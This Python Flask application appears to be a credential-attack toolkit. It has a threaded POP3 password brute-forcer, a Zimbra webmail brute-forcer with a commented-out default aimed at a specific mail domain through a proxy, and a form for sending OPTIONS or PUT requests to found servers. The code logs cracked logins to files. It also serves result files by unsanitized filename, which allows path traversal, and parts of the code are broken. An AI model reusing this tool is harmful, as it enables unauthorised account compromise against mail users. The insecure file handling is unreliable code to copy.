from flask import render_template,request, Flask, Response
import os
app = Flask(__name__)

#########################################################
##################### SCRIPTS - POP #####################
#########################################################

import threading, time, random, sys, poplib
from copy import copy

wordlist = []
words = []
users = []
popserver = ""
outputFilename = ""

def reloader():
	global wordlist
	global words
	for word in wordlist:
		words.append(word)

def getword():
	global wordlist
	global words
	global users
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			
			print "User:",user,"Password:",value
			pop = poplib.POP3(popserver)
			pop.user(user)
			pop.pass_(value)
			print "\t\nLogin successful:",value, user
			with open(outputFilename,"a+") as outputFile:
				outputFile.write("login Success to '%s': %s - %s\n" % (popserver,user,value))
			print pop.stat()
			pop.quit()
			# self.join()
			sys.exit(2)
		except (poplib.error_proto), msg: 
			# with open(outputFilename,"a+") as outputFile:
			# 	outputFile.write("Login Fail: %s - %s" % (user,value))
			pass

def execute_pop_bruteforce(p_popserver,usersListFilename,wordListFilename, p_outputFilename):
	print "execute"
	global wordlist
	global words
	global users
	global popserver
	global outputFilename
	outputFilename = p_outputFilename
	popserver = p_popserver
	try:
	  	users = open(usersListFilename, "r").readlines()
	except(IOError): 
	  	print "Error: Check your userlist path\n"
	  	sys.exit(1)
	  
	try:
	  	words = open(wordListFilename, "r").readlines()
	except(IOError): 
	  	print "Error: Check your wordlist path\n"
	  	sys.exit(1)
		
	try:
		pop = poplib.POP3(popserver)
		welcome = pop.getwelcome()
		pop.quit()
	except (poplib.error_proto): 
		welcome = "No Response"
		pass
	wordlist = copy(words)
	for i in range(len(words)*len(users)):
		work = Worker()
		work.start()
		time.sleep(0.0001)

#########################################################
##################### SCRIPTS - POP #####################
#########################################################


#########################################################
################### SCRIPTS - Zimbra ####################
#########################################################
def BruteForce_Zimbra(index_password, users, passes, url_template, domain, proxyHandler, httpsHandler, outputfilename):

	passw = passes[int(index_password)]
	try:
		for user in users:
			url = url_template.replace("##USERNAME##",user)

			'''Basic Auth'''
			passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
			passman.add_password(None, domain, user, passw)
			authhandler = urllib2.HTTPBasicAuthHandler(passman)


			''' Se instalan los handlers para abrir urls'''
			if proxyHandler!=None:
				opener = urllib2.build_opener(httpsHandler, authhandler, proxyHandler)
			else:
				opener = urllib2.build_opener(httpsHandler, authhandler)
			urllib2.install_opener(opener)

			'''Obtenemos los codigos de respuesta'''
			try:
				r = urllib2.urlopen(url)
				headers = r.info()
				print "PASS OK", user, passw
				with open(outputfilename,"a+") as outputFile:
					outputFile.write("login Success to '%s': %s - %s\n" % (domain,user,passw))
			except IOError, e:
				if hasattr(e,"code"):
					if e.code == 401:
						print "Pass Error",user,passw
					elif e.code == 404:
						print "User Error",user,passw
						'''si es un error de usuario, no seguimos intentando con otros pass'''
					else:
						pass
				else:
					print e
	except KeyboardInterrupt:
		print "Stopping process ..."
		sys.exit(1)    

def execute_zimbra_bruteforce(domain, users_filename, words_filename, output_filename):
	# domain = "correo.vera.com.uy"
	url_template = "https://%s/home/##USERNAME##/inbox.rss" % domain
	certFile = "vera.cacert.pem"
	# proxy_url = "http://104.41.151.86:80"
	# users_filename = "users.txt"
	# words_filename = "pass.txt"

	'''Loading Words'''
	try:
		with open(words_filename, "r") as passFile:
			passes = []
			for line in passFile.readlines():
				passes.append(line[:-1])
		print "%d passwords loaded from %s" % (len(passes), words_filename)
	except NameError:
		passes = ["q1w2e3", "e3w2q1", "tester", "testerwom", "aspire4712"]

	'''Loading Users'''
	try:
		with open(users_filename, "r") as usersFile:
			users = []
			for line in usersFile.readlines():
				users.append(line[:-1])
		print "%d passwords loaded from %s" % (len(users), users_filename)
	except NameError:
		users = ["user1", "tester", "testerwom","otrousuario"]

	'''HttpsHandler'''
	if not(os.path.exists(certFile) and os.path.isfile(certFile)):
		'''Retrieving the cert file'''
		print "Retrieving cert file"
		cert = ssl.get_server_certificate((domain,443))
		pem_path = os.path.expanduser(certFile)
		with open(pem_path, 'a+') as f:
			f.write(cert)
		print "Cert file write in %s" % certFile
	else:
		print "Using cert file %s" % certFile
	context = ssl.create_default_context()
	context.load_verify_locations(cafile = certFile)
	httpsHandler = urllib2.HTTPSHandler(context = context)

	'''Proxy Handler'''
	try:
		proxyHandler = urllib2.ProxyHandler({'http': proxy_url})
		print "Using proxy: %s" % proxy_url
	except NameError:
		proxyHandler = None
	''' index_password, users, passes, url_template, proxyHandler, httpsHandler'''
	for index_pass in range(len(passes)):
		t = threading.Thread(target=BruteForce_Zimbra, 
			args=(str(index_pass),users,passes,url_template,domain,
				proxyHandler,httpsHandler,output_filename))
		t.start()

#########################################################
################### SCRIPTS - Zimbra ####################
#########################################################

#########################################################
################## SCRIPTS - Options ####################
#########################################################
import urllib2
import urllib
import ssl
class MyRequestExtended(urllib2.Request):
	def __init__(self, *args, **kwargs):
		print "kwargs"
		print kwargs
		if 'method' in kwargs:
			self._method = kwargs['method']
			del kwargs['method']
		else:
			self._method = None
		print "kwargs"
		print kwargs
		return urllib2.Request.__init__(self, *args, **kwargs)

	def get_method(self, *args, **kwargs):
		if self._method is not None:
			return self._method
		return urllib2.Request.get_method(self, *args, **kwargs)

def sendRequest(target, p_method, certDir):
	if target.startswith("https"):

		cacertfilename = "%s/cacert.pem" % certDir
		print cacertfilename
		cert = ssl.get_server_certificate((target,443))
		pem_path = os.path.expanduser(cacertfilename)
		print pem_path
		with open(pem_path, 'w') as f:
			f.write(cert)
		context = ssl.create_default_context()
		context.load_verify_locations(cafile = cacertfilename)


	request = MyRequestExtended(target, None, method=p_method)
	
	if target.startswith("https"):
		response = urllib2.urlopen(request, context=context)
	else:
		response = urllib2.urlopen(request)
	
	return response

#########################################################
################## SCRIPTS - Options ####################
#########################################################

static_folder = "../static/"

UPLOAD_FOLDER = './uploads'
ALLOWED_EXTENSIONS = set(['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'])
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/hello/')
@app.route('/hello/<name>')
def hello(name=None):
	return render_template('hello.html', 
		name=name, 
		STATIC_URL=static_folder)

@app.route("/")
@app.route("/index")
def index():
	return render_template("index.html",STATIC_URL=static_folder)

@app.route("/pop", methods=['GET', 'POST'])
def popBruteForce():
	if request.method == "GET":
		return render_template("pop_brute_force.html",
			STATIC_URL=static_folder)
	else:
		server = request.form['popserver']
		usersFile = request.files['usersFile']
		newUsersFilename = os.path.join(app.config['UPLOAD_FOLDER'], usersFile.filename)
		usersFile.save(newUsersFilename)

		usersWords = request.files['usersWords']
		newWordsFilename = os.path.join(app.config['UPLOAD_FOLDER'], usersWords.filename)
		usersWords.save(newWordsFilename)
 
		outputFilename = "./output/popAttack.txt"
		
		execute_pop_bruteforce(server, newUsersFilename, newWordsFilename, outputFilename)
		
		return render_template("brute_force_results.html",
			STATIC_URL=static_folder,
			nameAttack="POP",
			results_url="popAttack.txt")

@app.route("/zimbra", methods=['GET', 'POST'])
def zimbraBruteForce():
	if request.method == "GET":
		return render_template("zimbra_brute_force.html",
			STATIC_URL=static_folder)
	else:
		server = request.form['zimbraserver']
		usersFile = request.files['usersFile']
		newUsersFilename = os.path.join(app.config['UPLOAD_FOLDER'], usersFile.filename)
		usersFile.save(newUsersFilename)

		usersWords = request.files['usersWords']
		newWordsFilename = os.path.join(app.config['UPLOAD_FOLDER'], usersWords.filename)
		usersWords.save(newWordsFilename)
 
		outputFilename = "./output/zimbraAttack.txt"
		
		execute_pop_bruteforce(server, newUsersFilename, newWordsFilename, outputFilename)
		
		return render_template("brute_force_results.html",
			STATIC_URL=static_folder,
			nameAttack="Zimbra",
			results_url="zimbraAttack.txt")

@app.route("/sendRequest", methods=['GET','POST'])
def sendOptions(): 
	'''Envia Options o PUT (cuando se encuentre un servidor)'''
	if request.method == "GET":
		return render_template("sendRequest.html",STATIC_URL=static_folder)
	else:
		target = request.form['target']
		method = request.form['method']
		print target,method
		response = sendRequest(target, method, app.config['UPLOAD_FOLDER'])
		# h = response.headers()
		
		output = []
		headers = response.info()
		for header in headers:
			output.append("<b>%s</b>: %s<br>" % (header,headers.getheader(header)))

		# return Response(" ".join(output))
		return render_template("sendRequest.html",
			result=" ".join(output),
			STATIC_URL=static_folder)


@app.route("/showResults/<filename>")
def showResults(filename):
	results = ""
	with open("./output/"+filename, "r") as rFile:
		results = rFile.read()

	return Response(results, mimetype='text/plain')

if __name__ == "__main__":
	app.run(debug=True)

